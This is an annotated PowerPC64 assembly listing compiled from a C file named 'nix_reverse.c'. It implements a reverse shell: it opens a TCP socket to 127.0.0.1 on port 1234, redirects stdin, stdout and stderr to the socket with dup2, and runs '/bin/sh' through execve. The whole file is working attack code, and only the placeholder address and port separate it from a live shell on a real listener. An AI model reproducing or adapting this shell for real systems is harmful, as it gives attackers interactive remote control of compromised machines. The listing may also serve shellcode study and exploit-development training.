	.file	"nix_reverse.c"
	.abiversion 2
	.section	".toc","aw"
	.section	".text"
	.section	.text.startup,"ax",@progbits
	.align 2
	.globl main
	.type	main, @function
main:
0:	addis 2,12,.TOC.-0b@ha
	addi 2,2,.TOC.-0b@l
	.localentry	main,.-main
  // 1 is stack pointer
	mflr 0               // get the link register in 0 
	std 31,-8(1)         // save 31
	li 4,1               // 4 = SOCK_STREAM 
	li 5,0               // 5 = IPPROTO_IP
	li 3,2               // 3 = AF_INET
	std 0,16(1)          // 1[16] = 0
	stdu 1,-80(1)        // save stack pointer
	bl socket
  
	nop
	li 9,2               // 9 = AF_INET
	li 5,16              // 5 = sizeof(sa)
	addi 4,1,32          // 4 = 1 + 32
	sth 9,32(1)          // sa.sin_family = AF_INET 
	li 9,-11772          // port 1234
	mr 31,3              // save socket in 31
	sth 9,34(1)          // sa.sin_port = htons(1234)
	lis 9,0x100          // load 0x100 
	ori 9,9,127          // store 127
	std 9,36(1)          // sa.sin_addr = 127
	bl connect
	
  nop
	li 4,0                // fd = FILENO_STDIN
	mr 3,31               // 3  = s
	bl dup2
	
  nop
	li 4,1                // fd = FILENO_STDOUT
	mr 3,31               // 3  = s
	bl dup2
	
  nop
	li 4,2                // fd = FILENO_STDERR
	mr 3,31               // 3  = s
	bl dup2
	
  nop
	addis 3,2,.LC0@toc@ha // Add Immediate Shifted 
	li 9,0
	addi 3,3,.LC0@toc@l
	addi 4,1,48           // 4 = argv 
	li 5,0                // env = 0 
	std 9,56(1)           // argv[1] = 0
	std 3,48(1)           // argv[0] = "/bin/sh"
	bl execve
	
  nop
	addi 1,1,80
	li 3,0
	b _restgpr0_31
	.long 0
	.byte 0,0,0,1,128,1,0,0
	.size	main,.-main
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"/bin/sh"
	.ident	"GCC: (Debian 4.9.2-10) 4.9.2"
	.section	.note.GNU-stack,"",@progbits
